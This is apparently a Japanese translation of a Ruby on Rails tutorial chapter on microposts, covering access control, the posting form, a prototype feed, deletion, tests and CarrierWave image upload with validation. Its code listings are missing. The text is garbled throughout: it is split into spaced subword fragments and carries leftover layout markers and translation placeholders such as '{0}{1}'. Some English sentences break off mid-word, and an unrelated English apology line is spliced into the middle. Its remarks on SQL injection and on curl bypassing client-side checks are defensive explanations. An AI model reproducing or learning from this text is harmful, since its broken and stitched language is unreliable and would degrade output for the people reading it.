▁\ label { table : RESTful _ microposts } }< n >\ end { table }< n >< n > ▁\ subsection { マイクロポストの アクセス 制 御 } ▁% ▁( fold )< n > ▁\ label { sec : micropost _ access _ control }< n >< n >
▁ Microposts リソース の 開発 では 、 Microposts コントローラ 内の アクセス 制 御 から 始 め る ことにしましょう 。
▁ 関連付けられた ユーザー を通して マイクロポスト にアクセス する ので 、\ ko de { create } アクション や \ ko de { destroy } アクション を 利用 する ユーザー は 、 ログイン 済み で なければなりません 。
▁ ログイン 済み かどうかを 確かめ る テストでは 、 Users コントローラ 用の テストが そのまま 役 に 立 ち ます ▁( リスト \ ref { code : edit _ update _ redirect _ tests } 、 リスト \ ref { code : action _ tests _ admin })。
▁つまり 、 正しい リクエストを 各 アクションに 向け て 発 行 し 、 マイクロポストの 数 が 変 化 していない かどうか 、 また 、 リダイレクト される かどうかを 確かめ れば よい のです ▁( リスト \ ref { code : create _ destroy _ micropost _ tests })。
▁ Microposts コントローラの 認 可 テスト
▁リスト \ ref { code : create _ destroy _ micropost _ tests } の テストにパス するために は 、 少し アプリケーション 側 の コードを リファクタリング しておく必要があります 。
▁という の も 、\ ref { sec : requir ing _ logged _ in _ users } では 、 before フィルター の \ ko de { logged \_ in \_ user } メソッドを使って 、 ログイン を 要求 した こと について 思い 出 してください ▁( リスト \ ref { code : author ize _ before _ filter })。
▁ あ のとき は Users コントローラ 内に このメソッド が あった ので 、 before フィルター で 指定 していました が 、 ▁このメソッドは Microposts コントローラ でも 必要 です 。 そこで 、 各 コントローラ が 継 承 する Application コントローラに ▁(\ ref { sec : a _ controller _ class }) 、 このメソッド を 移 し てしまい ましょう 。
▁作成した コードをリスト \ ref { code : sessions _ helper _ authenticate } に示します
▁\ ko de { logged \_ in \_ user } メソッドを Application コントローラに 移 す
▁ store _ location
▁ コードが 重複 しない よう 、 このとき Users コントローラ から も \ ko de { logged _ in _ user } を 削除 しておきましょう 。
▁リスト \ ref { code : sessions _ helper _ authenticate } のコード によって 、 Microposts コントローラ から も \ ko de { logged _ in _ user } メソッドを 呼 び 出 せる ようになりました 。 これにより 、\ ko de { create } アクション や \ ko de { destroy } アクション に対する アクセス 制限 が 、 before フィルター で 簡単に 実装 できるようになります ▁( リスト \ ref { code : microposts _ controller _ access _ control })。
▁ Microposts コントローラの 各 アクションに 認 可 を追加する
▁これで テストにパス するはずです 。
▁ 第 \ ref { cha : sign _ up } 章では 、 HTTP ▁\ text tt { POST } リクエストを Users コントローラの \ ko de { create } アクションに 発行する HTML フォーム を作成する ことで 、 ユーザーの サインアップ を 実装 しました 。
▁ マイクロポスト 作成 の実装 も これ と似ています 。 主 な 違 い は 、 別の ▁ micropost / new ▁ ページ を使う 代わりに 、 ホ ー ム 画面 ▁( つまり ルート パス ) ▁ に フォーム を 置 く という 点 です 。 図 \ ref { fig : home _ page _ with _ micropost _ form _ mockup } のモックアップ を見 てください 。
▁ マイクロポスト 作成 フォーム のある ホ ー ム 画面 のモックアップ
▁最後に ホ ー ム 画面 を 実装 した とき は ▁( 図 \ ref { fig : sample _ app _ log o }) 、[ S ig n ▁ up ▁ now ! ] ▁ ボタン が 中 央 に あり ました 。
▁ マイクロポスト 作成 フォーム は 、 ログイン している 特定の ユーザーの コンテキスト で のみ 機能 する ので 、 この節 の 一 つの 目 標 は 、 ユーザーの ログイン 状態 に応じて 、 ホ ー ム 画面 の 表示 を変更する ことです 。
▁これ については 、 リスト \ ref { code : microposts _ home _ page } で 実装します 。
▁置き換えた結果を \ ref { code : microposts _ create _ action } に示します 。
▁\ ko de { micropost \_ params } で S trong ▁Parameters を 使用している ことにより 、 マイクロポストの \ ko de { content } 属性 だけ が Web 経由で 変更 可能 になっている ことに注目してください 。
▁ Microposts コントローラの \ ko de { create } アクション
▁ マイクロポスト 作成 フォーム を 構 築 するために 、 サイト 訪 問 者 が ログイン している かどうか に応じて 異なる HTML を 提 供 する コード を使用します ▁( リスト \ ref { code : microposts _ home _ page })。
▁ Home ページ ▁(\ href { http :// localhost :3000/ }{/ }) ▁ に マイクロポストの 投 稿 フォーム を追加する
▁\ ko de { if } - \ ko de { else } 分 岐 を使用して コードを 書き 分 け ている 点が 少し 汚 い ですが 、 このコード の ク リ ー ン アップ は 演習 に 回 す ことにします ▁(\ ref { sec : micropost _ exercises })。
▁リスト \ ref { code : microposts _ home _ page } の コードを 動か す ためには 、 いくつかの P ar t i al を 作る 必要があります 。
▁まずは Home ページの 新しい サイドバー からです 。 以下の リスト \ ref { code : user _ info } のようになります 。
▁ サイドバー で 表示する ユーザー情報 の パーシャル
▁ プロフィール サイドバー ▁( リスト \ ref { code : user _ show _ microposts }) ▁ のとき と同様 、 リスト \ ref { code : user _ info } の ユーザー情報 にも 、 その ユーザーが 投 稿 した マイクロポストの 総 数 が表示され ていることに注目してください 。
▁ただし 少し 表示 に 違 い があります 。 プロフィール サイドバー では 、 ▁“ Microposts ” ▁ を ラ ベ ル と し 、 “ Microposts ▁ (1) ” ▁ と 表示する ことは 問題 ありません 。
▁しかし 、 今回の ように ▁“ 1 ▁ microposts ” ▁ と 表示 してしまう と 英語 の 文法 上 誤 り になってしまい ます 。 そこで 、\ ref { sec : signup _ error _ messages } で紹介した \ ko de { pluralize } メソッドを使って ▁“ 1 ▁ micropost ” ▁ や ▁“ 2 ▁ microposts ” ▁ と 表示する ように 調 整 しています 。
▁ 次 は マイクロポスト 作成 フォーム を定義し ます ▁( リスト \ ref { code : micropost _ form })。 これは ユーザー登録フォーム に 似 ています ▁( リスト \ ref { code : signup _ form })。
▁ マイクロポスト 投 稿 フォームの パーシャル
▁リスト \ ref { code : micropost _ form } の フォーム が 動く ように するために は 、 2 箇所 の 変更 が必要です 。
▁1 つ は 、 ( 以前 と同様 ) ▁ 関連付け を使用して 次のように \ ko de {@ micropost } を定義する ことです 。
▁作成した コードをリスト \ ref { code : micropost _ instance _ variable } に示します
▁\ ko de { home } アクションに マイクロポストの インスタンス変数 を追加する
▁リスト \ ref { code : micropost _ form } を 動か す ための もう 1 つの 変更 は 、 エラーメッセージ の パーシャル を 再 定義 することです 。 で なければ 、 リスト \ ref { code : micropost _ form } の 次の コードが 動 き ません 。
▁リスト \ ref { code : f _ error _ messages } では エラーメッセージ パーシャル が \ ko de {@ user } 変数 を直接 参 照 して いた ことを思い出してください 。 今回は 代わりに \ ko de {@ micropost } 変数 を使う 必要があります 。
▁これらの ケース を まとめ ると 、 フォーム 変数 \ ko de { f } を \ ko de { f . object } と すること によって 、 関連付けられたオブジェクト にアクセス することができます 。 したがって 、 以下のコード の場合
▁\ ko de { f . object } は \ ko de {@ user } と なり 、 以下のコード の場合は
▁ここで い う ▁\ ko de { f . object } ▁ は 、\ ko de {@ micropost } ▁ など になります 。
▁ パーシャル に オブジェクトを 渡す ために 、 値が オブジェクト で 、 キー が パーシャル で の 変数 名 と同じ ハッシュ を 利用 します 。 これ で 、 リスト \ ref { code : micropost _ form } の 2 行 目 のコード が 完成 します 。
▁ 言 い 換 え ると 、\ ko de { object : ▁f . object } は \ ko de { error \_ messages } パーシャル の中で \ ko de { object } という 変数 名 を作成し てくれる ので 、 この 変数 を使って エラーメッセージ を 更新 すれば よい ということです ▁( リスト \ ref { code : updated _ error _ messages _ partial })。
▁User オブジェクト 以外 でも 動作する ように error _ messages パーシャル を更新する
▁ な ぜ 失敗 している の でしょう か 。 ヒント は error _ messages パーシャル の 他の 出 現 場所 です 。 この パーシャル は 他の 場所 でも 使われ ていた ため 、 ユーザー登録 ▁( リスト \ ref { code : f _ error _ messages }) 、 パスワード再設定 ▁( リスト \ ref { code : password _ reset _ form }) 、 そして ユーザー 編集 ▁( リスト \ ref { code : user _ edit _ view }) ▁ の それぞれの ビュー を更新する 必要 が あった のです 。
▁ 各 ビュー を更新し た 結果を 、 リスト \ ref { code : signup _ errors _ updated } 、 リスト \ ref { code : password _ reset _ updated } 、 リスト \ ref { code : edit _ errors _ updated } に示します 。
▁ ユーザー登録 時の エラー 表示 を更新する
▁ユーザー 編集 時の エラー 表示 を更新する
▁ パスワード再設定 時の エラー 表示 を更新する
▁これで 、 すべての テストが \ passing するはずです 。
▁さらに 、 この章 で作成した すべての HTML が 適切に 表示される ようになった はずです 。 最終的な フォーム を 図 \ ref { fig : home _ with _ form } に 、 投 稿 エラーが表示され た フォーム を 図 \ ref { fig : home _ form _ errors } に示します 。
▁ 新しいマイクロポスト フォーム のある Home ページ
▁ エラーが表示され た Home ページ
▁ マイクロポスト 投 稿 フォーム が 動く ようになりました が 、 今 の 段 階 では 投 稿 した 内容 を すぐ に 見 ること が できません 。 という の も 、 Home ページに まだ マイクロポスト を表示する 部分 が 実装 されていない からです 。
▁ 図 \ ref { fig : home _ with _ form } の フォーム が正しく 動作 している かどうかを確認 したい場合 、 正しい エ ン ト リ ー を 投 稿 した 後 、\ href { http :// localhost :3000/ users /1 } { プロフィール ページ } に移動し て ポ スト を 表示 すれば よい のですが 、 これは かなり 面倒 な 作業 です 。
▁ 図 \ ref { fig : proto _ feed _ mockup } のモックアップ で示した ような 、 ユーザー 自身 の ポ スト を含む マイクロポストの \ ko de { フィード } がない と 不 便 です
▁( {0}{1} 第 12 章 {/1}{/0} では フィード を 汎 用 化 し 、 現在のユーザー によって \ emph { フォロー されている } ユーザーの マイクロポスト も 一 緒 に 表示する フィード にする 予定です )。
▁ 試 作 フィード がある Home ページのモックアップ
▁ すべての ユーザーが フィード を持つ ので 、\ ko de { feed } メソッドは User モデル で 作る の が 自 然 です 。 フィード の 原 型 では 、 まず は 現在 ログイン している ユーザーの マイクロポスト をすべて 取得 して きます 。
▁( 次 章 で 完全な フィード を実装する ため ) ▁ 今回は { p 0} で紹介した {2} where {/2} メソッドで これを 実現 します 。 {2} Micropost {/2} モデル に変更 を加え た 結果を 、 リスト \ ref { code : proto _ status _ feed } に示します
▁\ href { http :// guides . rubyonrails . org / active _ record _ query ing . html } { where } メソッド や 他の 関連する メソッド の詳細については 、 Rails ガイド の \ ko de { Active ▁Record ▁ クエリ インターフェイス } を 読んで ください 。
▁ マイクロポストの ステータスフィード を実装する ための 準備
▁# ▁ 試 作 feed の 定義
▁# ▁ 完全な 実装 は 第 12 章 「 ユーザーを フォロー する 」 を参照してください 。
▁ 以下のコード で 使用されている 疑問符 は 、 セキュリティ 上 重要な 役 割 を 果 た しています 。
▁上の 疑問符 がある ことで 、 SQL クエリ に インクルード される 前に \ ko de { id } が 適切に \ emph { エスケープ } される ことを 保 証 してくれ るため 、\ href { http :// en . w ikipedia . org / wiki / SQL _ in j ec tion }{\ emph { SQL インジェクション } } と呼ばれる 深 刻 な セキュリティ ホ ー ル を避ける ことができます 。
▁ この場合 の \ ko de { id } 属性 は 単なる 整 数 ▁( す な わ ち \ ko de { self . id } は ユーザーの id ) ▁ である ため 危 険 はありません が 、 SQL 文 に インクルード される 変数 を \ emph { 常に } エスケープ する 習慣 は ぜ ひ 身 に つ け てください 。
▁ 注意 深 い 読者 は 、 リスト \ ref { code : proto _ status _ feed } のコードは 本 質 的に 次の コード と 同 等 であること に 気 付 く かもしれません 。
▁上のコード を使用 せずに あえて リスト \ ref { code : proto _ status _ feed } の コードを 利用 した のは 、\ ref { cha : following _ users } で 必要となる 完全な ステータスフィード で 応 用 が 効 く ためです 。
▁ サンプルアプリケーション で フィード を使う ために 、 カ レ ン ト ユーザーの ページ 分割 された フィード に \ ko de {@ feed \_ item s } インスタンス変数 を追加し ▁( リスト \ ref { code : feed _ instance _ variable }) 、 次に フィード 用の パーシャル ▁( リスト \ ref { code : feed _ partial }) ▁ を Home ページ に追加します 。 Home ページに 変更 を加え た 結果 は リスト \ ref { code : home _ with _ feed } で 示 します 。
▁このとき 、 ユーザーが ログイン している かどうか を調べ る 後 置 if 文 が 変 化 して いる点に注目してください 。 す な わ ち 、 リスト \ ref { code : feed _ instance _ variable } では 、 次の コードが
▁リスト \ ref { code : micropost _ instance _ variable } のとき
▁ といった 前 置 if 文 に 変 わ っています ▁( 訳 注 : ▁1 行 のとき は 後 置 if 文 、 2 行 以上 のとき は 前 置 if 文 を使う の が Ruby の 習慣 です )。
▁\ ko de { home } アクションに フィード の インスタンス変数 を追加する
▁ ステータスフィード の パーシャル
▁ ステータスフィード の パーシャル は 、 Micropost の パーシャル ▁( リスト \ ref { code : micropost _ partial }) ▁ とは 異 な って いる点に注目してください 。
▁この ように 、 Rails は 対応する 名前 の パーシャル を 、 与えられた リソース の ディレクトリ 内 から 探 し に い く ことができます 。
▁ 後 は 、 いつものように フィード パーシャル を 表示 すれば Home ページに フィード を 追加 できます ▁( リスト \ ref { code : home _ with _ feed })。
▁この 結果 は Home ページの フィード として 表示 されます ▁( 図 \ ref { fig : home _ with _ proto _ feed })。
▁ Home ページに ステータスフィード を追加する
▁ 試 作 フィード のある Home ページ
▁ 現時点では 、 新しいマイクロポスト の作成 は 図 \ ref { fig : micropost _ created } で示した ように 期待どおり に 動作 しています 。
▁ただし さ さ い な ことで は あります が 、 マイクロポストの 投 稿 が \ emph { 失敗する } と 、 ▁ Home ページ は \ ko de {@ feed \_ item s } インスタンス変数 を 期 待 している ため 、 現 状 では 壊 れ てしまいます 。
▁ 最も 簡単な 解決 方法は 、 リスト \ ref { code : microposts _ create _ action _ with _ feed } のように 空 の配列 を 渡 しておくこと です 。
▁ 残 念 ですが 、 この場合は ページ 分割 された フィード を返し ても うまく 動 き ません 。
▁ 動か ない 理由 を 確認 したい 方は 、 実際に 実装 して ページネーション の リンクを クリック してみてください 。
▁ 新しいマイクロポスト を 作成した 直 後 の Home ページ
▁\ ko de { create } アクションに 空 の \ ko de {@ feed \_ item s } インスタンス変数 を追加する
▁ 最後の 機能 として 、 マイクロポスト リソース に ポ スト を削除する 機能 を追加します 。
▁これは ユーザー 削除 と同様に ( \ ref { sec : the _ destroy _ action }) 、 " delete " ▁ リンク で 実現 します ▁( 図 \ ref { fig : micropost _ delete _ links _ mockup })。
▁ユーザーの 削除 は 管理者 ユーザー のみ が 行える ように 制限 され ていた の に 対 し 、 今回の 場合は カ レ ン ト ユーザーが 作成した マイクロポスト に対して のみ 削除リンク が 動作する ようにします 。
▁ マイクロポストの 削除リンク と 試 作 フィード のモックアップ
▁ 最初の ステップ として 、 マイクロポストの パーシャル ▁( リスト \ ref { code : micropost _ partial }) ▁ に 削除リンク を追加します 。
▁作成した コードをリスト \ ref { code : micropost _ partial _ with _ delete } に示します
▁ マイクロポストの パーシャル に 削除リンク を追加する
▁次に 、 Microposts コントローラの \ ko de { destroy } アクション を定義し ましょう 。 これ も 、 ユーザー における 実装 ▁( リスト \ ref { code : admin _ destroy _ before _ filter }) ▁ と だ いた い お な じ で s
▁ 大きな 違 い は 、\ ko de { admin \_ user } フィルター で \ ko de {@ user } 変数 を使う の ではなく 、 関連付け を使って マイクロポスト を見つけ るように している 点 です 。 これにより 、 ある ユーザーが 他の ユーザーの マイクロポスト を削除し よう と すると 、 自動的に 失敗する ようになります 。
▁ 具体的には 、\ ko de { correct \_ user } フィルター 内で \ ko de { find } メソッド を呼び出す ことで 、 カ レ ン ト ユーザーが 削除 対象 の マイクロポストを 保 有 している かどうかを確認 します 。
▁作成した コードをリスト \ ref { code : microposts _ destroy _ action } に示します
▁ Microposts コントローラの \ ko de { destroy } アクション
▁このとき 、 ▁リスト \ ref { code : microposts _ destroy _ action } の \ ko de { destroy } メソッド では リダイレクト を使って いる点に注目してください 。
▁これは 、 HTTP の 仕 様 として 定義されている \ text tt { HTTP _ RE F ER ER } と 対応 しています 。 ▁ ちなみに ▁“ ref er er ” ▁ は 誤 字 ではありません 。 仕 様 では 確 か に この ( 間 違 った ) ス ペ ル を 使っている のです 。
▁ 一方 、 Rails は ▁“ ref er r er ” ▁という 正しい ス ペ ル で 使 っています 。
▁ 私 も Rails が どう や って この URL を取得し ている のか 、 パ ッ と 思い 出 す ことはできません で した 。 そこで 、 Google で ▁“ rails ▁ request ▁ prev io us ▁ url ” ▁ と 検索 し 、\ href { http :// st ack o ver flow . com / que st ions / 4 6 5 2 08 4 / ruby - on - rails - h o w - do - y o u - get - the - prev io us - url } { S t ack ▁ O ver flow の ス レ ッ ド } を見つけ 、 この 答 え に 至 り ました 。
▁ このため 、 マイクロポスト が Home ページ から 削除 された 場合 でも Pro file ページ から 削除 された 場合 でも 、\ ko de { request . ref er r er } を使う ことで DELETE リクエスト が 発 行 された ページに 戻 す ことができる ので 、 非常に 便利です 。
▁I f ▁the ▁ ref er r ing ▁ URL ▁is ▁\ ko de { nil } ▁( as ▁is ▁the ▁ case ▁in s id e ▁ some ▁ tests ) , ▁リスト \ ref { code : microposts _ destroy _ action } ▁ set s ▁the ▁\ ko de { root \_ url } ▁as ▁the ▁ default ▁ us ing ▁the ▁\ ko de { | | } ▁ o per at or .
▁( リスト \ ref { code : test _ helper _ log _ in } で定義した デフォルト オプション と 比 較 してみてください 。 )
▁これらの コード により 、 上 から 2 番目の マイクロポスト を削除する と 、 図 ▁\ ref { fig : home _ post _ delete } のように うまく 動く はずです 。
▁2 番 目 に 新しいマイクロポスト を削除し た 後 のユーザー Home ページ
▁\ ref { sec : destroy ing _ microposts } のコード で 、 Micropost モデルと その イン ター フ ェ ー ス が 完成 しました 。
▁ 残 っている 箇所 は 、 Microposts コントローラの 認 可 をチェックする 短 い テスト と 、 それら を まとめ る 統合 テストを書く ことです 。
▁まずは マイクロポスト 用の fixture に 、 別 々 の ユーザーに 紐 付け られ た マイクロポストを 追加 していきます ▁( リスト \ ref { code : add _ micropost _ d if f er ent _ own er })。
▁( 今 は こ のうち の 1 つ しか 使い ません が 、 あ と で 他の マイクロポスト も 利用 していきます 。 )
▁ 別の ユーザーに 所 属 している マイクロポスト を追加する
▁I ' m ▁ s or ry .
▁ Y our ▁ word s ▁ ma de ▁ s en s e , ▁ b u t ▁your ▁ s ar ca s tic ▁to n e ▁d id ▁ not .
▁次に 、 自分 以外の ユーザーの マイクロポスト は 削除 を し よう と すると 、 適切に リダイレクト される ことを テスト で 確認 します ▁( リスト \ ref { code : micropost _ user _ m is match _ test })。
▁ 間 違 った ユーザー による マイクロポスト 削除 に対して テスト する
▁最後に 、 統合テスト を 書き ます 。 今回の 統合テスト では 、 ログイン 、 マイクロポストの ページ 分割 の 確認 、 無効な マイクロポストを 投 稿 、 有効な マイクロポストを 投 稿 、 マイクロポストの 削除 、 そして 他の ユーザーの マイクロポスト には ▁[ delete ] ▁ リンク が表示され ない ことを確認 、 といった 順 で テスト していきます 。
▁ いつものように 、 統合テスト を生成する ところ から 始 め ましょう 。
▁ 先ほど の 順 で 書いた 統合テスト は 、 リスト \ ref { code : microposts _ in ter fa ce _ test } のようになります 。
▁リスト \ ref { code : micropost _ valid ity _ test _ id io ma tic } で 書いた コード と 、 先ほど の ステップ が 結合 されている 点に注意 してください 。
▁( リスト \ ref { code : microposts _ in ter fa ce _ test } では \ ko de { post } ▁ followed ▁ by ▁\ ko de { follow _ redirect ! }
▁ マイクロポストの U I に対する 統合テスト
▁ 既に アプリケーション 側 のコードは 実装 して あるので 、 この テストは ▁\ passing \ ▁ するはずです 。
▁ ここ まで で マイクロポスト に関する 基本的な 操作 はすべて 実装 できました 。 この節 では 、 応 用 編 として 画像 付き マイクロポストを 投 稿 できるように してみます 。 No w ▁that ▁we ’ ve ▁ add ed ▁ support ▁for ▁ all ▁ re le v an t ▁ micropost ▁ action s , ▁in ▁this ▁we ’ ll ▁ ma ke ▁it ▁ p o
▁ 手順 として は 、 まず は 開発環境 用の β 版 を 実装 し 、 その後 、 いくつかの 改 善 を と お して 本番環境 用の 完成 版 を 実装します 。
▁ 画像 アップロード 機能 を追加する ためには 、 2 つの 視 覚 的な 要素 が必要です 。 1 つ は 画像 を アップロード するための フォーム 、 もう 1 つ は 投 稿 された 画像 その ものです 。
▁[ U p load ▁ image ] ▁ ボタン と 画像 付き マイクロポスト のモックアップ を 図 \ ref { fig : micropost _ image _ mockup } に示します
▁ 画像 付き マイクロポストを 投 稿 した とき のモックアップ
▁\ label { fig : micropost _ image _ mockup } }< n >\ end { figure }< n >< n >\ subsection { 基本的な 画像 アップロード } ▁% ▁( fold )< n >\ label { sec : basic _ image _ upload }< n >< n >
▁ 投 稿 した 画像 を 扱 った り 、 その 画像 を Micropost モデルと 関連付け するために 、 今回は \ href { https :// github . com / c ar ri er w a ve upload er / c ar ri er w a ve } { CarrierWave } という 画像 アップ ロー ダ ー を使います 。
▁また リスト \ ref { code : gemfile _ c ar ri er w a ve } では 、 あ と で 必要 になる \ text tt { mini _ ma g i c k } ▁gem と \ text tt { f o g } ▁gem s も 含 め て いる点に注目してください 。 これらの gem は 画像 を リ サイズ したり ▁(\ ref { sec : image _ re s i z ing }) 、 本番環境で 画像 を アップロード する ▁(\ ref { sec : image _ upload _ in _ production }) ▁ ために 使い ます 。
▁次に 、 いつものように インストール します 。
▁ CarrierWave を 導入 すると 、 Rails の ジェネレータ ー で 画像 アップ ロー ダ ー が 生成 できるようになります 。 早 速 、 次の コマンド を実行し てみましょう ▁( 画像 の ことを image と すると 一般的 過 ぎ る ので 、 今回は \ ko de { picture } と 呼 ぶ ことにします )
▁ 最 初 は \ ko de { image } という 属性 名 を使って いた のですが 、 この 名前 だと 一般的 す ぎ て 、 逆 に 混 乱 を 招 い てしまい ました 。
▁ CarrierWave で アップロード された 画像 は 、 Active ▁Record モデルの 属性 と 関連付け されている べ き です 。 関連付け される 属性 には 画像 の ファイル名 が 格 納 される ため 、 String 型 に しておきます 。
▁ 拡 張 した マイクロポストの データモデル を 、 図 \ ref { fig : micropost _ model _ picture } に示します 。
▁\ ko de { picture } 属性 を追加した マイクロポストの データモデル
▁ 必要となる \ ko de { picture } 属性を Micropost モデル に追加 するために 、 マイグレーション ファイル を生成し 、 開発環境 の データベース に適用 します 。
▁ CarrierWave に 画像 と 関連付け た モデル を 伝 え るために は 、\ ko de { m o un t \_ upload er } という メソッド を使います 。 このメソッドは 、 引数に 属性 名 の シンボル と 生成された アップ ロー ダ ー の クラス名 を 取り ます 。
▁(\ ko de { picture \_ upload er . rb } という ファイル で \ ko de { P i ct ur e U p load er } クラス が 定義 されています 。 \ ref { sec : image _ validation } で 修正 します が 、 今 は デフォルトの ま まで 大 丈 夫 です 。 )
▁ Micropost モデルに アップ ロー ダ ー を追加した 結果を リスト \ ref { code : micropost _ model _ picture } に示します 。
▁ Micropost モデルに 画像 を追加する
▁ システム によって は 、 ここで 一 旦 Rails サーバーを再起動 させる 必要があります 。 再 起動 させ たら テストスイート を 走 ら せ て みてください 。 ▁\ passing ▁ している はずです 。
▁( ただし 、\ ref { sec : guard } で説明した Guard を 使っている 場合は 、 再 起動 させる だけで は うまく 動か ない かもしれません 。 その 場合は ターミナル から 一 旦 抜 け て 、 新しい ターミナル で Guard を 再 実行 してみてください 。 )
▁ 図 ▁\ ref { fig : micropost _ image _ mockup } のように Home ページ 常に アップ ロー ダ ー を追加する ためには 、 マイクロポストの フォーム に \ ko de { file \_ field } タグ を含め る必要があります ▁( リスト \ ref { code : micropost _ create _ image _ upload })。
▁ マイクロポスト 投 稿 フォーム に 画像 アップ ロー ダ ー を追加する
▁このとき 、
▁\ ko de { form \_ for } の 引数に 上の オプション が追加され ていることに注目してください 。 これは ファイルを アップロード する 際に 必要となる オプション です 。
▁最後に 、 Web から 更新 できる 許可 リスト に \ ko de { picture } 属性 を追加しましょう 。
▁ 追加 すると 、\ ko de { micropost \_ params } メソッドは リスト \ ref { code : micropost _ params _ picture } のようになります 。
▁\ ko de { picture } を 許可 された 属性 の リスト に追加する
▁ 一度 画像 が アップロード され れば 、 Micropost パーシャル の \ ko de { image \_ tag } ヘルパー で その 画像 を 描画 できるようになります ▁( リスト \ ref { code : micropost _ partial _ image _ d is p la y })。
▁また 、 画像 の 無 い ▁( テキスト のみ の ) ▁ マイクロポスト では 画像 を 表示 させ ないように するために 、\ ko de { picture ?} という 論理値 を返す メソッドを使って いる点に注目してください 。
▁このメソッドは 、 画像 用の 属性 名 に応じて 、 CarrierWave が自動的に 生成 し てくれる メソッド です 。
▁ 手動で 画像 付き の 投 稿 を してみる と 、 図 ▁\ ref { fig : micropost _ with _ image } のようになります 。
▁ 画像 アップロード に対するテスト は 、 演習 に 回 します ▁(\ ref { sec : micropost _ exercises })。
▁ マイクロポストの 画像 表示 画面 を追加する
▁ 画像 付き マイクロポストを 投 稿 した 結果
▁\ ref { sec : basic _ image _ upload } の アップ ロー ダ ー も 悪 く はありません が 、 いくつかの 目 立 つ 欠 点 があります 。
▁ 例 えば 、 アップロード された 画像 に対する 制限 がない ため 、 も し ユーザーが 巨 大 な ファイルを 上 げ たり 、 無効な ファイルを 上 げ ると 問題 が発生し てしまいます 。
▁この 欠 点 を 直 す ために 、 画像 サイズ や フォーマット に対する バリデーション を 実装 し 、 サーバー 用 と クライアント ▁( ブラウザ ) ▁ 用の 両方 に追加 しましょう 。
▁ 最初の バリデーション では 、 有効な 画像 の 種類 を 制限 していきます が 、 これは CarrierWave の アップ ロー ダ ー の中に 既に ヒント があります 。
▁ 生成された アップ ロー ダ ー の中に コメントアウト された コード があります が 、 ここ の コメントアウト を 取り 消 す ことで 、 画像 の ファイル名 から 有効な 拡張子 ▁( P N G / G I F / J P E G など ) ▁ を検証する ことができます ▁( リスト \ ref { code : validate _ picture _ format })。
▁ 画像 フォーマット のバリデーション
▁2 つ目の バリデーション では 、 画像 の サイズ を 制 御 します 。 これは Micropost モデルに 書き 足 していきます 。
▁ 先ほど のバリデーション とは 異 なり 、 ファイル サイズ に対する バリデーション は Rails の 既存の オプション ▁( presence や length など ) ▁ に はありません 。
▁ したがって 、 今回は 手動で \ ko de { picture \_ size } という 独自の バリデーション を定義し ます 。 結果 は リスト \ ref { code : micropost _ model _ image _ validation } の とおりです 。
▁ 独自の バリデーション を定義する ために 、 今 まで 使って いた \ ko de { validates } メソッド ではなく 、\ ko de { validate } メソッドを使って いる点に注目してください 。
▁ 画像 に対する バリデーション を追加する
▁この validate メソッド では 、 引数に シンボル ▁(\ ko de { : picture \_ size }) ▁ を 取り 、 その シンボル 名 に 対応 した メソッド を呼び出します 。
▁リスト \ ref { code : validate _ picture _ format } や リスト \ ref { code : micropost _ model _ image _ validation } で定義した 画像 のバリデーション を ビュー に 組 み 込 む ために 、 クライアント 側 に 2 つの 処理 を追加しましょう 。
▁まずは フォーマット のバリデーション を 反 映 するために は 、\ ko de { file \_ field } タグ に \ ko de { accept } パラメータ を 付 与 して 使い ます 。
▁このとき accept パラメータ では 、 リスト { p 0} で 許可 した ファイル 形式 を 、\ href { https :// en . w ikipedia . org / wiki / In ter net _ media _ type } { M I M E タイプ } で 指定 する ようにします 。
▁次に 、 大 き すぎる ファイル サイズ に対して 警 告 を 出 す ために 、 ち ょ っ と した JavaScript ▁( 正 確 には \ href { http :// jquery . com /}{ j Query }) ▁ を 書き 加 え ます 。 こうすることで 、 長 すぎる アップロード 時間 を 防 い だ り 、 サーバー への 負 荷 を 抑 え たり すること に 繋 が ります 。
▁ これはリスト \ ref { code : micropost _ create _ image _ upload } で使用されていま した 。
▁( ブラウザ 上で 画面 を 右 クリック し 、 イン ス ペ ク ター で 要素 を調べ ると 確認 できます )。
▁つまり 、 この CSS ▁id を持つ 要素 が 変 化 した とき 、 この j Query の 関数 が 動 き 出 します 。 そして 、 も し ファイル サイズ が 大 き す ぎ た場合 、\ ko de { alert } メソッドで 警 告 を 出 す といった 仕組み です
▁この 手 の トピック を学ぶ には 「 Google で ▁“ javascript ▁ ma x im um ▁ file ▁ size ” といった 関連する キーワード で 検索 し 、 S t ack ▁ O ver flow が 見つか る まで ▁( 検索 ワ ー ド を 調 整 し ながら ) ▁ 繰り返す 」 、 これ が 一 番 です 。
▁これらの 追加 的な チェック 機能を まとめ ると 、 リスト \ ref { code : _ format _ jquery _ file _ test } のようになります 。
▁ ファイル サイズ を j Query で チェック する
▁ ちなみに 、 リスト \ ref { code : _ format _ jquery _ file _ test } のような コード では 大 き すぎる ファイルの アップロード を 完全に は 阻 止 できない 、 という 点 を 覚 え て おいてください 。
▁という の も 、 このコード は 送信 フォーム を使った 投 稿 は 制限 でき ても 、 イン ス ペ ク ター 画面 で JavaScript を い じ って 投 稿 したり 、\ text tt { c url } など を使って 直接 \ ko de { POST } リクエストを 送信 する 場合には 制限 できない からです 。
▁ こういった 場合に も 対応 できるように する ため 、 リスト \ ref { code : micropost _ model _ image _ validation } で 実装 した サーバー 側 のバリデーション も 重要な のです 。
▁ ファイル サイズ に対する バリデーション ▁(\ ref { sec : image _ validation }) ▁ は うまく い き ましたが 、 画像 サイズ ▁( 縦 横 の 長さ ) ▁ に対する 制限 は ないので 、 大 き すぎる 画像 サイズ が アップロード される と 図 \ ref { fig : l ar g e _ upload ed _ image } のように レイアウト が 壊 れ てしまいます 。
▁ とは い え 、 ユーザーに 手 元 で 画像 サイズ を変更 させる のは 不 便 です 。 なので 、 画像 を 表示 させる 前に サイズ を変更する ▁( リ サイズ する ) ▁ ように してみましょう
▁ 他の 解決 策 として CSS で \ emph { 表示 } サイズ を 調 整 する方法 もあります が 、 これ だと ファイル サイズ が 変 わ り ません 。
▁ 結果 として 、 ファイル サイズ の 大きな 画像 によって 、 読み込み 時間 が 長 くなる といった 問題 が発生し ます 。
▁たとえば ▁" 小 さ い " ▁ 画像 を表示する だけ な の に 、 や たら に 読み込み 時間 が 長 い ウ ェ ブ サイトに 訪 れ た ことはありません か 。
▁これ が その 原 因 です 。
▁ 恐 ろ しく 大きな アップロード 画像
▁ 画像 を リ サイズ するために は 、 画像 を 操作 する プログラム が 必要 になります 。 今回は \ href { http :// www . image ma g i c k . org /}{ I m age M a g i c k } という プログラム を使う ので 、 これを 開発環境 に インストール しておく 必要 になります
